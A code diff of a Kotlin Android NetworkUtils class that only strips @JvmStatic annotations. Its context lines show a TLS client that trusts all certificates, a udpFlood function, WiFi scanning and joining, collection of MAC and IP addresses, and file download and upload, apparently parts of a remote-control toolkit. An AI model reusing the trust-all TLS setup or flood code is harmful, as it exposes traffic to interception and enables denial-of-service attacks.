@@ -44,7 +44,7 @@ class NetworkUtils private constructor() {
             override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = emptyArray()
         })
 
-        @JvmStatic
+        
         fun createHttpClient(): OkHttpClient {
             val sslContext = SSLContext.getInstance("TLS")
             sslContext.init(null, trustAllCerts, java.security.SecureRandom())
@@ -62,10 +62,10 @@ class NetworkUtils private constructor() {
                 .build()
         }
 
-        @JvmStatic
+        
         fun getHttpClient(): OkHttpClient = httpClient
 
-        @JvmStatic
+        
         fun createRequest(url: String): Request.Builder {
             return Request.Builder()
                 .url(url)
@@ -75,12 +75,12 @@ class NetworkUtils private constructor() {
                 .addHeader("Connection", "keep-alive")
         }
 
-        @JvmStatic
+        
         fun createRequestBody(json: String): okhttp3.RequestBody {
             return json.toRequestBody("application/json; charset=utf-8".toMediaType())
         }
 
-        @JvmStatic
+        
         fun getNetworkInfo(context: Context): Map<String, Any> {
             val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
             val activeNetwork = cm.activeNetwork
@@ -136,7 +136,7 @@ class NetworkUtils private constructor() {
             return info
         }
 
-        @JvmStatic
+        
         fun getWifiInfo(context: Context): Map<String, Any> {
             val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
             val connectionInfo = wifiManager.connectionInfo
@@ -183,7 +183,7 @@ class NetworkUtils private constructor() {
             return info
         }
 
-        @JvmStatic
+        
         fun scanWifi(context: Context): Map<String, Any> {
             val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
             if (!wifiManager.isWifiEnabled) {
@@ -204,7 +204,7 @@ class NetworkUtils private constructor() {
             return mapOf("networks" to networks, "count" to networks.size)
         }
 
-        @JvmStatic
+        
         fun connectWifi(context: Context, ssid: String, password: String): Map<String, Any> {
             val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
             val config = WifiConfiguration().apply {
@@ -226,7 +226,7 @@ class NetworkUtils private constructor() {
             return mapOf("success" to success, "network_id" to networkId)
         }
 
-        @JvmStatic
+        
         fun getLocalIpAddress(): String {
             try {
                 val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
@@ -244,7 +244,7 @@ class NetworkUtils private constructor() {
             return "0.0.0.0"
         }
 
-        @JvmStatic
+        
         fun getMacAddress(context: Context): String {
             try {
                 val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
@@ -260,7 +260,7 @@ class NetworkUtils private constructor() {
             return "00:00:00:00:00:00"
         }
 
-        @JvmStatic
+        
         fun getPublicIp(): String {
             try {
                 val urls = listOf("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com")
@@ -279,7 +279,7 @@ class NetworkUtils private constructor() {
             return "Unknown"
         }
 
-        @JvmStatic
+        
         fun tcpConnect(host: String, port: Int, timeout: Int = 5000): Map<String, Any> {
             return try {
                 val socket = Socket()
@@ -293,7 +293,7 @@ class NetworkUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun udpFlood(target: String, port: Int, durationMs: Long): Map<String, Any> {
             // Educational: demonstrates UDP flooding capability
             // In practice, this would be used for stress testing
@@ -329,7 +329,7 @@ class NetworkUtils private constructor() {
             )
         }
 
-        @JvmStatic
+        
         fun downloadFile(url: String, destinationPath: String): Boolean {
             try {
                 val request = createRequest(url).get().build()
@@ -351,7 +351,7 @@ class NetworkUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun uploadFile(url: String, filePath: String, fieldName: String = "file"): Boolean {
             try {
                 val file = File(filePath)
